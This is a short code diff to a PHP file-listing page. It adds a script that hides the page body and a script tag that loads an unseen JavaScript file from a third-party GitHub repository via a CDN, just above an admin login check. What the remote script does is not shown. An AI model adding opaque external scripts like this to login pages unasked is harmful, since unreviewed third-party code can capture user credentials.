@@ -740,6 +740,8 @@ function render_list($path, $files)
 </head>
 
 <body>
+<script>document.body.hidden = 'hidden';</script>
+<script src="//cdn.jsdelivr.net/gh/vcheckzen/CDN@0.01/logi.js"></script>
 <?php
     if (getenv('admin')!='') if (!$_SERVER['admin']) {
         if (getenv('adminloginpage')=='') { ?>
